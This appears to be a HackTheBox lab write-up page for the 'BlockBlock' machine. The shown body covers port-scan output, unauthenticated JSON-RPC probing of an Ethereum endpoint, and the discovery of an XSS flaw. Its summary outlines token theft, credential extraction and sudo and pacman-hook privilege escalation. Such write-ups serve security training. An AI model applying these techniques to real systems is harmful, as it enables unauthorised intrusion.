@@ -1,0 +1,401 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sgg5joot><head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/png" href="/favicon.png"><link rel="icon" href="/favicon.ico" sizes="any"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Zumpyx Blog" href="https://blog.zumpyx.com/rss.xml"><meta name="generator" content="Astro v7.1.0"><meta name="color-scheme" content="light dark"><meta name="theme-color" content="#0b0d11" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#f4f5f7" media="(prefers-color-scheme: light)"><script>
+	(() => {
+		try {
+			const t = localStorage.getItem('theme');
+			if (t === 'light' || t === 'dark') document.documentElement.setAttribute('data-theme', t);
+			else document.documentElement.removeAttribute('data-theme');
+		} catch {}
+	})();
+</script><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/89758defcfa85239.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/14aa8dd5744dd4bc.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/89758defcfa85239.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/14aa8dd5744dd4bc.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://blog.zumpyx.com/hackthebox/machines/0635-blockblock/"><!-- Primary Meta Tags --><title>BlockBlock · Zumpyx Blog</title><meta name="description" content="BlockBlock is a hard-difficulty Linux machine hosting a decentralized chat application built on a blockchain with two primary smart contracts: `Users.sol` and `Database.sol`. The application includes a &amp;quot;Report User&amp;quot; functionality vulnerable to XSS, which can be exploited to steal the admin's token via an exposed API endpoint. Gaining admin access allows us to retrieve the authorization token needed to interact with the blockchain's `/api/json-rpc` endpoint. By enumerating transaction blocks, we extract credentials for user `keira`. Privilege escalation to user `paul` is achieved by leveraging `keira`'s `sudo` permissions to execute the Forge CLI tool as `paul`. Finally, `paul` has root access to the `pacman` package manager, which can be exploited via the post-install hook feature to execute arbitrary commands as root."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.zumpyx.com/hackthebox/machines/0635-blockblock/"><meta property="og:title" content="BlockBlock · Zumpyx Blog"><meta property="og:description" content="BlockBlock is a hard-difficulty Linux machine hosting a decentralized chat application built on a blockchain with two primary smart contracts: `Users.sol` and `Database.sol`. The application includes a &amp;quot;Report User&amp;quot; functionality vulnerable to XSS, which can be exploited to steal the admin's token via an exposed API endpoint. Gaining admin access allows us to retrieve the authorization token needed to interact with the blockchain's `/api/json-rpc` endpoint. By enumerating transaction blocks, we extract credentials for user `keira`. Privilege escalation to user `paul` is achieved by leveraging `keira`'s `sudo` permissions to execute the Forge CLI tool as `paul`. Finally, `paul` has root access to the `pacman` package manager, which can be exploited via the post-install hook feature to execute arbitrary commands as root."><meta property="og:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://blog.zumpyx.com/hackthebox/machines/0635-blockblock/"><meta name="twitter:title" content="BlockBlock · Zumpyx Blog"><meta name="twitter:description" content="BlockBlock is a hard-difficulty Linux machine hosting a decentralized chat application built on a blockchain with two primary smart contracts: `Users.sol` and `Database.sol`. The application includes a &amp;quot;Report User&amp;quot; functionality vulnerable to XSS, which can be exploited to steal the admin's token via an exposed API endpoint. Gaining admin access allows us to retrieve the authorization token needed to interact with the blockchain's `/api/json-rpc` endpoint. By enumerating transaction blocks, we extract credentials for user `keira`. Privilege escalation to user `paul` is achieved by leveraging `keira`'s `sudo` permissions to execute the Forge CLI tool as `paul`. Finally, `paul` has root access to the `pacman` package manager, which can be exploited via the post-install hook feature to execute arbitrary commands as root."><meta name="twitter:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><link rel="stylesheet" href="/_astro/Header.BMe4uPxC.css"><style>.machine-list[data-astro-cid-twh6cqtg]{border:1px solid var(--border);border-radius:var(--radius);background:var(--bg-elevated);box-shadow:var(--shadow);margin-bottom:2rem;padding:1rem 1.15rem}.machine-list[data-astro-cid-twh6cqtg] h2[data-astro-cid-twh6cqtg]{font-size:1.1rem;font-family:var(--font-mono);color:var(--accent);margin:0 0 .65rem}.machine-list[data-astro-cid-twh6cqtg] ul[data-astro-cid-twh6cqtg]{margin:0;padding-left:1.2rem}.machine-list[data-astro-cid-twh6cqtg] li[data-astro-cid-twh6cqtg]{margin:.35rem 0}.machine-ref[data-astro-cid-twh6cqtg]{color:var(--text-bright);align-items:center;gap:.5rem;text-decoration:none;display:inline-flex}.machine-ref[data-astro-cid-twh6cqtg]:hover{color:var(--accent)}.machine-ref[data-astro-cid-twh6cqtg] img[data-astro-cid-twh6cqtg]{object-fit:cover;border:1px solid var(--border);border-radius:6px}.missing[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-family:var(--font-mono);font-size:.9em}.diff[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-size:.9em}.diff[data-astro-cid-twh6cqtg].very-easy{color:var(--very-easy)}.diff[data-astro-cid-twh6cqtg].easy{color:var(--easy)}.diff[data-astro-cid-twh6cqtg].medium{color:var(--medium)}.diff[data-astro-cid-twh6cqtg].hard{color:var(--hard)}.diff[data-astro-cid-twh6cqtg].insane{color:var(--insane)}
+main[data-astro-cid-sgg5joot]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-sgg5joot]{width:100%}.hero-image[data-astro-cid-sgg5joot] img[data-astro-cid-sgg5joot]{border-radius:var(--radius);border:1px solid var(--border);box-shadow:var(--shadow);margin:0 auto;display:block}.prose[data-astro-cid-sgg5joot]{width:720px;max-width:calc(100% - 2em);color:var(--text);margin:auto;padding:1em}.prose[data-astro-cid-sgg5joot] img{border-radius:var(--radius-sm);border:1px solid var(--border);max-width:100%;height:auto}.prose[data-astro-cid-sgg5joot] a{color:var(--link)}.title[data-astro-cid-sgg5joot]{text-align:center;margin-bottom:1.25em;padding:1.25em 0 .5em;line-height:1.2}.title-row[data-astro-cid-sgg5joot]{justify-content:center;align-items:center;gap:.85rem;margin:0 0 .5em;display:flex}.title-row[data-astro-cid-sgg5joot] .avatar[data-astro-cid-sgg5joot],.title-row[data-astro-cid-sgg5joot] img{border-radius:var(--radius-sm);object-fit:contain;border:1px solid var(--border);width:52px;height:52px;box-shadow:0 0 20px var(--accent-glow);background:0 0;flex:none}.title[data-astro-cid-sgg5joot] h1[data-astro-cid-sgg5joot]{margin:0;font-size:clamp(1.75rem,4vw,2.5rem)}.date[data-astro-cid-sgg5joot]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;margin-bottom:.65em;font-size:.85rem}.last-updated-on[data-astro-cid-sgg5joot]{opacity:.85;margin-top:.25em;font-style:normal}.meta[data-astro-cid-sgg5joot]{flex-wrap:wrap;justify-content:center;gap:.45em;margin:.85em 0 0;display:flex}.meta[data-astro-cid-sgg5joot] .badge{font-size:.72rem;font-weight:600;font-family:var(--font-mono);letter-spacing:.06em;color:var(--text);border:1px solid var(--border);text-transform:uppercase;background:#ffffff08;border-radius:999px;align-items:center;gap:.35em;padding:.35em .75em;display:inline-flex;box-shadow:inset 0 1px #ffffff08}.meta[data-astro-cid-sgg5joot] .badge.difficulty-very-easy{color:var(--very-easy);background:#9ef01a1a;border-color:#9ef01a52}.meta[data-astro-cid-sgg5joot] .badge.difficulty-easy{color:var(--easy);background:#9fef001f;border-color:#9fef0059}.meta[data-astro-cid-sgg5joot] .badge.difficulty-medium{color:var(--medium);background:#ffcc001f;border-color:#ffcc0059}.meta[data-astro-cid-sgg5joot] .badge.difficulty-hard{color:var(--hard);background:#ff88001f;border-color:#f806}.meta[data-astro-cid-sgg5joot] .badge.difficulty-insane{color:var(--insane);background:#ff3e3e1f;border-color:#ff3e3e66}.links[data-astro-cid-sgg5joot]{font-size:.9rem;font-family:var(--font-mono);flex-wrap:wrap;justify-content:center;gap:1em;margin-top:.9em;display:flex}.links[data-astro-cid-sgg5joot] a{color:var(--accent);text-decoration:none}.links[data-astro-cid-sgg5joot] a:hover{text-underline-offset:.2em;text-decoration:underline}
+.nav-link[data-astro-cid-evkijfd6]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;text-transform:uppercase;white-space:nowrap;border:1px solid #0000;border-radius:999px;justify-content:center;align-items:center;padding:.5em .95em;font-size:.78rem;font-weight:500;text-decoration:none;transition:color .18s,background .18s,border-color .18s,box-shadow .18s;display:inline-flex}.nav-link[data-astro-cid-evkijfd6]:hover{color:var(--text-bright);background:var(--surface-hover);text-decoration:none}.nav-link[data-astro-cid-evkijfd6].active{color:var(--on-accent);background:linear-gradient(135deg, var(--accent-hover), var(--accent));box-shadow:0 0 0 1px var(--border-strong), 0 6px 16px var(--accent-glow-strong);text-shadow:none;border-color:#0000;font-weight:700;text-decoration:none}
+</style><script type="module" src="/_astro/page.CTxKKjGj.js"></script></head><body data-astro-cid-sgg5joot><div class="scanline" aria-hidden="true" data-astro-cid-sgg5joot></div><header data-astro-cid-nen7h5rs><div class="bar" data-astro-cid-nen7h5rs><a class="brand" href="/" data-astro-cid-nen7h5rs><span class="logo" aria-hidden="true" data-astro-cid-nen7h5rs><img src="/_astro/head.CE6FOIKY_1SW1hc.webp" srcset="/_astro/head.CE6FOIKY_1SW1hc.webp 1x, /_astro/head.CE6FOIKY_scYzG.webp 2x" alt data-astro-cid-nen7h5rs="true" loading="lazy" decoding="async" width="64" height="64" class="logo-img"></span><span class="brand-text" data-astro-cid-nen7h5rs><span class="prompt" aria-hidden="true" data-astro-cid-nen7h5rs>~/</span><span class="brand-name" data-astro-cid-nen7h5rs>Zumpyx Blog</span></span></a><nav class="nav-pill" aria-label="Primary" data-astro-cid-nen7h5rs><div class="nav-track" data-astro-cid-nen7h5rs><a href="/" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Home</a><a href="/blog" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Blog</a><a href="/hackthebox" class="nav-link active" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>HackTheBox</a><a href="/projects" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Projects</a><a href="/about" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>About</a></div></nav><div class="actions" data-astro-cid-nen7h5rs><button type="button" class="icon-btn search-trigger" data-search-open aria-label="搜索" title="搜索 (Ctrl/⌘+K)" data-astro-cid-7yy3665x><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg></button><div class="search-root" data-search-root hidden data-astro-cid-7yy3665x><div class="search-backdrop" data-search-close data-astro-cid-7yy3665x></div><div class="search-panel" role="dialog" aria-modal="true" aria-label="全站搜索" data-astro-cid-7yy3665x><div class="search-bar" data-astro-cid-7yy3665x><svg class="search-ico" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg><input type="search" class="search-input" data-search-input placeholder="全文搜索：标题 / 正文 / 标签…" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="search" data-astro-cid-7yy3665x><kbd class="search-kbd" data-search-close-hint data-astro-cid-7yy3665x>Esc</kbd></div><div class="search-meta" data-search-meta data-astro-cid-7yy3665x>输入关键词开始搜索</div><ul class="search-results" data-search-results role="listbox" aria-label="搜索结果" data-astro-cid-7yy3665x></ul></div></div><script type="module" src="/_astro/SiteSearch.astro_astro_type_script_index_0_lang.CiT4pk6n.js"></script><button type="button" class="icon-btn theme-toggle" data-theme-toggle aria-label="主题：跟随系统" title="主题：跟随系统（点击切换）" data-astro-cid-l6lhmie6><span class="icon icon-system" aria-hidden="true" data-astro-cid-l6lhmie6><!-- auto / system --><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><rect x="3" y="4" width="18" height="12" rx="2" data-astro-cid-l6lhmie6></rect><path d="M8 20h8M12 16v4" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-light" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><circle cx="12" cy="12" r="4" data-astro-cid-l6lhmie6></circle><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-dark" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><path d="M21 14.5A8.5 8.5 0 1 1 9.5 3a7 7 0 0 0 11.5 11.5z" stroke-linejoin="round" data-astro-cid-l6lhmie6></path></svg></span></button><script>
+	(() => {
+		const KEY = 'theme';
+		const ORDER = ['system', 'light', 'dark'];
+		const LABELS = {
+			system: '主题：跟随系统',
+			light: '主题：亮色',
+			dark: '主题：暗色',
+		};
+
+		const getStored = () => {
+			try {
+				const v = localStorage.getItem(KEY);
+				if (v === 'light' || v === 'dark' || v === 'system') return v;
+			} catch {}
+			return 'system';
+		};
+
+		const apply = (mode) => {
+			const root = document.documentElement;
+			if (mode === 'light' || mode === 'dark') root.setAttribute('data-theme', mode);
+			else root.removeAttribute('data-theme');
+			try {
+				if (mode === 'system') localStorage.removeItem(KEY);
+				else localStorage.setItem(KEY, mode);
+			} catch {}
+		};
+
+		const syncButton = (mode) => {
+			document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+				btn.setAttribute('data-mode', mode);
+				btn.setAttribute('aria-label', LABELS[mode]);
+				btn.setAttribute('title', `${LABELS[mode]}（点击切换）`);
+				btn.querySelectorAll('.icon').forEach((el) => {
+					el.hidden = true;
+				});
+				const icon = btn.querySelector(`.icon-${mode}`);
+				if (icon) icon.hidden = false;
+			});
+		};
+
+		const mode = getStored();
+		apply(mode);
+		syncButton(mode);
+
+		document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+			btn.addEventListener('click', () => {
+				const cur = getStored();
+				const next = ORDER[(ORDER.indexOf(cur) + 1) % ORDER.length];
+				apply(next);
+				syncButton(next);
+			});
+		});
+
+		// If following system, react to OS changes
+		try {
+			const mq = window.matchMedia('(prefers-color-scheme: dark)');
+			mq.addEventListener?.('change', () => {
+				if (getStored() === 'system') apply('system');
+			});
+		} catch {}
+	})();
+</script><a class="icon-btn" href="/rss.xml" target="_blank" rel="noopener noreferrer" title="RSS" aria-label="RSS 订阅" data-astro-cid-nen7h5rs><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-nen7h5rs><path d="M5 19a1.5 1.5 0 1 0 0.01 0" fill="currentColor" stroke="none" data-astro-cid-nen7h5rs></path><path d="M4 11a9 9 0 0 1 9 9" stroke-linecap="round" data-astro-cid-nen7h5rs></path><path d="M4 5a15 15 0 0 1 15 15" stroke-linecap="round" data-astro-cid-nen7h5rs></path></svg></a></div></div></header><main data-astro-cid-sgg5joot><article data-astro-cid-sgg5joot><div class="prose" data-astro-cid-sgg5joot><div class="title" data-astro-cid-sgg5joot><div class="date" data-astro-cid-sgg5joot><time datetime="2024-11-16T00:00:00.000Z">2024-11-16</time></div><div class="title-row" data-astro-cid-sgg5joot><img src="/_astro/avatar.xFqv8blK_1hhY1I.webp" alt data-astro-cid-sgg5joot="true" loading="lazy" decoding="async" width="48" height="48" class="avatar"><h1 data-astro-cid-sgg5joot>BlockBlock</h1></div><div class="meta" data-astro-cid-sgg5joot><span class="badge" data-astro-cid-twh6cqtg>Machines</span><span class="badge" data-astro-cid-twh6cqtg>#635</span><span class="badge difficulty-hard" data-astro-cid-twh6cqtg>Hard</span><span class="badge" data-astro-cid-twh6cqtg>Linux</span><span class="badge" data-astro-cid-twh6cqtg>blockblock</span></div><div class="links" data-astro-cid-sgg5joot><a href="/hackthebox/machines/" data-astro-cid-twh6cqtg>← Machines</a></div><hr data-astro-cid-sgg5joot></div><h2 id="recon--enum">Recon &amp; Enum</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>PORT     STATE SERVICE VERSION</span></span>
+<span class="line"><span>22/tcp   open  ssh     OpenSSH 9.7 (protocol 2.0)</span></span>
+<span class="line"><span>| ssh-hostkey: </span></span>
+<span class="line"><span>|   256 d6:31:91:f6:8b:95:11:2a:73:7f:ed:ae:a5:c1:45:73 (ECDSA)</span></span>
+<span class="line"><span>|_  256 f2:ad:6e:f1:e3:89:38:98:75:31:49:7a:93:60:07:92 (ED25519)</span></span>
+<span class="line"><span>80/tcp   open  http    Werkzeug/3.0.3 Python/3.12.3</span></span>
+<span class="line"><span>|_http-title:          Home  - DBLC    </span></span>
+<span class="line"><span>| fingerprint-strings: </span></span>
+<span class="line"><span>|   GetRequest: </span></span>
+<span class="line"><span>|     HTTP/1.1 200 OK</span></span>
+<span class="line"><span>|     Server: Werkzeug/3.0.3 Python/3.12.3</span></span>
+<span class="line"><span>|     Date: Mon, 25 Nov 2024 01:09:02 GMT</span></span>
+<span class="line"><span>|     Content-Type: text/html; charset=utf-8</span></span>
+<span class="line"><span>|     Content-Length: 275864</span></span>
+<span class="line"><span>|     Access-Control-Allow-Origin: http://0.0.0.0/</span></span>
+<span class="line"><span>|     Access-Control-Allow-Headers: Content-Type,Authorization</span></span>
+<span class="line"><span>|     Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS</span></span>
+<span class="line"><span>|     Connection: close</span></span>
+<span class="line"><span>|     &lt;!DOCTYPE html&gt;</span></span>
+<span class="line"><span>|     &lt;html&gt;</span></span>
+<span class="line"><span>|     &lt;head&gt;</span></span>
+<span class="line"><span>|     &lt;title&gt;</span></span>
+<span class="line"><span>|     Home - DBLC</span></span>
+<span class="line"><span>|     &lt;/title&gt;</span></span>
+<span class="line"><span>|     &lt;link rel="stylesheet" href="/assets/nav-bar.css"&gt;</span></span>
+<span class="line"><span>|     &lt;/head&gt;</span></span>
+<span class="line"><span>|     &lt;body&gt;</span></span>
+<span class="line"><span>|     &lt;!-- &lt;main&gt; --&gt;</span></span>
+<span class="line"><span>|     &lt;meta charset=utf-8&gt;</span></span>
+<span class="line"><span>|     &lt;meta name=viewport content="width=device-width, initial-scale=1"&gt;</span></span>
+<span class="line"><span>|     &lt;style&gt;</span></span>
+<span class="line"><span>|     :after,</span></span>
+<span class="line"><span>|     :before {</span></span>
+<span class="line"><span>|     box-sizing: border-box;</span></span>
+<span class="line"><span>|     border: 0 solid #e5e7eb</span></span>
+<span class="line"><span>|     :after,</span></span>
+<span class="line"><span>|     :before {</span></span>
+<span class="line"><span>|     --tw-content: ""</span></span>
+<span class="line"><span>|     :host,</span></span>
+<span class="line"><span>|     html {</span></span>
+<span class="line"><span>|     line-height: 1.5;</span></span>
+<span class="line"><span>|   HTTPOptions: </span></span>
+<span class="line"><span>|     HTTP/1.1 500 INTERNAL SERVER ERROR</span></span>
+<span class="line"><span>|     Server: Werkzeug/3.0.3 Python/3.12.3</span></span>
+<span class="line"><span>|     Date: Mon, 25 Nov 2024 01:09:03 GMT</span></span>
+<span class="line"><span>|     Content-Type: text/html; charset=utf-8</span></span>
+<span class="line"><span>|     Content-Length: 265</span></span>
+<span class="line"><span>|     Access-Control-Allow-Origin: http://0.0.0.0/</span></span>
+<span class="line"><span>|     Access-Control-Allow-Headers: Content-Type,Authorization</span></span>
+<span class="line"><span>|     Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS</span></span>
+<span class="line"><span>|     Connection: close</span></span>
+<span class="line"><span>|     &lt;!doctype html&gt;</span></span>
+<span class="line"><span>|     &lt;html lang=en&gt;</span></span>
+<span class="line"><span>|     &lt;title&gt;500 Internal Server Error&lt;/title&gt;</span></span>
+<span class="line"><span>|     &lt;h1&gt;Internal Server Error&lt;/h1&gt;</span></span>
+<span class="line"><span>|_    &lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt;</span></span>
+<span class="line"><span>|_http-server-header: Werkzeug/3.0.3 Python/3.12.3</span></span>
+<span class="line"><span>| http-methods: </span></span>
+<span class="line"><span>|_  Supported Methods: GET HEAD OPTIONS</span></span>
+<span class="line"><span>|_http-favicon: Unknown favicon MD5: D07AD703EDD6F8326B5C45F86CA8084E</span></span>
+<span class="line"><span>8545/tcp open  unknown</span></span>
+<span class="line"><span>| fingerprint-strings: </span></span>
+<span class="line"><span>|   GetRequest: </span></span>
+<span class="line"><span>|     HTTP/1.1 400 BAD REQUEST</span></span>
+<span class="line"><span>|     Server: Werkzeug/3.0.3 Python/3.12.3</span></span>
+<span class="line"><span>|     Date: Mon, 25 Nov 2024 01:09:03 GMT</span></span>
+<span class="line"><span>|     content-type: text/plain; charset=utf-8</span></span>
+<span class="line"><span>|     Content-Length: 43</span></span>
+<span class="line"><span>|     vary: origin, access-control-request-method, access-control-request-headers</span></span>
+<span class="line"><span>|     access-control-allow-origin: *</span></span>
+<span class="line"><span>|     date: Mon, 25 Nov 2024 01:09:03 GMT</span></span>
+<span class="line"><span>|     Connection: close</span></span>
+<span class="line"><span>|     Connection header did not include 'upgrade'</span></span>
+<span class="line"><span>|   HTTPOptions: </span></span>
+<span class="line"><span>|     HTTP/1.1 200 OK</span></span>
+<span class="line"><span>|     Server: Werkzeug/3.0.3 Python/3.12.3</span></span>
+<span class="line"><span>|     Date: Mon, 25 Nov 2024 01:09:03 GMT</span></span>
+<span class="line"><span>|     Content-Type: text/html; charset=utf-8</span></span>
+<span class="line"><span>|     Allow: OPTIONS, GET, HEAD, POST</span></span>
+<span class="line"><span>|     Access-Control-Allow-Origin: *</span></span>
+<span class="line"><span>|     Content-Length: 0</span></span>
+<span class="line"><span>|     Connection: close</span></span>
+<span class="line"><span>|   Help: </span></span>
+<span class="line"><span>|     &lt;!DOCTYPE HTML&gt;</span></span>
+<span class="line"><span>|     &lt;html lang="en"&gt;</span></span>
+<span class="line"><span>|     &lt;head&gt;</span></span>
+<span class="line"><span>|     &lt;meta charset="utf-8"&gt;</span></span>
+<span class="line"><span>|     &lt;title&gt;Error response&lt;/title&gt;</span></span>
+<span class="line"><span>|     &lt;/head&gt;</span></span>
+<span class="line"><span>|     &lt;body&gt;</span></span>
+<span class="line"><span>|     &lt;h1&gt;Error response&lt;/h1&gt;</span></span>
+<span class="line"><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;</span></span>
+<span class="line"><span>|     &lt;p&gt;Message: Bad request syntax ('HELP').&lt;/p&gt;</span></span>
+<span class="line"><span>|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;</span></span>
+<span class="line"><span>|     &lt;/body&gt;</span></span>
+<span class="line"><span>|     &lt;/html&gt;</span></span>
+<span class="line"><span>|   RTSPRequest: </span></span>
+<span class="line"><span>|     &lt;!DOCTYPE HTML&gt;</span></span>
+<span class="line"><span>|     &lt;html lang="en"&gt;</span></span>
+<span class="line"><span>|     &lt;head&gt;</span></span>
+<span class="line"><span>|     &lt;meta charset="utf-8"&gt;</span></span>
+<span class="line"><span>|     &lt;title&gt;Error response&lt;/title&gt;</span></span>
+<span class="line"><span>|     &lt;/head&gt;</span></span>
+<span class="line"><span>|     &lt;body&gt;</span></span>
+<span class="line"><span>|     &lt;h1&gt;Error response&lt;/h1&gt;</span></span>
+<span class="line"><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;</span></span>
+<span class="line"><span>|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;</span></span>
+<span class="line"><span>|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;</span></span>
+<span class="line"><span>|     &lt;/body&gt;</span></span>
+<span class="line"><span>|_    &lt;/html&gt;</span></span></code></pre>
+<h2 id="shell-as-keira">Shell as Keira</h2>
+<p><img alt="image-20241125093137518.png" loading="lazy" decoding="async" width="1254" height="1339" src="/_astro/image-20241125093137518.D69YDUZc_Z2qbncF.webp" srcset=""></p>
+<p>打开 80 端口正文出现 blockchain 并且右下角发现以太坊字样，因此推断 8545 端口是一个区块链祥光的 RPC 接口。尝试未授权访问</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>curl -v --request POST --url http://10.10.11.43:8545/ --header 'accept: application/json' --header 'content-type: application/json' --data '{"id": 1, "jsonrpc": "2.0", "method": "eth_blockNumber"}'</span></span>
+<span class="line"><span>Note: Unnecessary use of -X or --request, POST is already inferred.</span></span>
+<span class="line"><span>*   Trying 10.10.11.43:8545...</span></span>
+<span class="line"><span>* Connected to 10.10.11.43 (10.10.11.43) port 8545</span></span>
+<span class="line"><span>&gt; POST / HTTP/1.1</span></span>
+<span class="line"><span>&gt; Host: 10.10.11.43:8545</span></span>
+<span class="line"><span>&gt; User-Agent: curl/8.8.0</span></span>
+<span class="line"><span>&gt; accept: application/json</span></span>
+<span class="line"><span>&gt; content-type: application/json</span></span>
+<span class="line"><span>&gt; Content-Length: 56</span></span>
+<span class="line"><span>&gt; </span></span>
+<span class="line"><span>* upload completely sent off: 56 bytes</span></span>
+<span class="line"><span>&lt; HTTP/1.1 200 OK</span></span>
+<span class="line"><span>&lt; Server: Werkzeug/3.0.3 Python/3.12.3</span></span>
+<span class="line"><span>&lt; Date: Mon, 25 Nov 2024 01:43:14 GMT</span></span>
+<span class="line"><span>&lt; content-type: application/json</span></span>
+<span class="line"><span>&lt; Content-Length: 41</span></span>
+<span class="line"><span>&lt; vary: origin, access-control-request-method, access-control-request-headers</span></span>
+<span class="line"><span>&lt; access-control-allow-origin: *</span></span>
+<span class="line"><span>&lt; date: Mon, 25 Nov 2024 01:43:14 GMT</span></span>
+<span class="line"><span>&lt; Connection: close</span></span>
+<span class="line"><span>&lt; </span></span>
+<span class="line"><span>* Closing connection</span></span>
+<span class="line"><span>{"jsonrpc":"2.0","id":1,"result":"0x313"}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>curl -v --request POST --url http://10.10.11.43:8545/ --header 'accept: application/json' --header 'content-type: application/json' --data '{"id": 1,"jsonrpc": "2.0","method": "net_version"}'</span></span>
+<span class="line"><span>Note: Unnecessary use of -X or --request, POST is already inferred.</span></span>
+<span class="line"><span>*   Trying 10.10.11.43:8545...</span></span>
+<span class="line"><span>* Connected to 10.10.11.43 (10.10.11.43) port 8545</span></span>
+<span class="line"><span>&gt; POST / HTTP/1.1</span></span>
+<span class="line"><span>&gt; Host: 10.10.11.43:8545</span></span>
+<span class="line"><span>&gt; User-Agent: curl/8.8.0</span></span>
+<span class="line"><span>&gt; accept: application/json</span></span>
+<span class="line"><span>&gt; content-type: application/json</span></span>
+<span class="line"><span>&gt; Content-Length: 50</span></span>
+<span class="line"><span>&gt; </span></span>
+<span class="line"><span>* upload completely sent off: 50 bytes</span></span>
+<span class="line"><span>&lt; HTTP/1.1 401 UNAUTHORIZED</span></span>
+<span class="line"><span>&lt; Server: Werkzeug/3.0.3 Python/3.12.3</span></span>
+<span class="line"><span>&lt; Date: Mon, 25 Nov 2024 01:46:55 GMT</span></span>
+<span class="line"><span>&lt; Content-Type: application/json</span></span>
+<span class="line"><span>&lt; Content-Length: 40</span></span>
+<span class="line"><span>&lt; Access-Control-Allow-Origin: *</span></span>
+<span class="line"><span>&lt; Connection: close</span></span>
+<span class="line"><span>&lt; </span></span>
+<span class="line"><span>{"error":"Proxy Couldn't verify token"}</span></span>
+<span class="line"><span>* Closing connection</span></span></code></pre>
+<p>请求 net_version 时就开始要求 token 认证了，继续查看 80 端口页面</p>
+<p><img alt="image-20241125100206564.png" loading="lazy" decoding="async" width="1207" height="1345" src="/_astro/image-20241125100206564.CnpwPth3_HFczY.webp" srcset=""></p>
+<p>注册账号登陆后看到一个 BOT，发现在 Report User 功能点处存在 XSS 漏洞，还是机器人的请求</p>
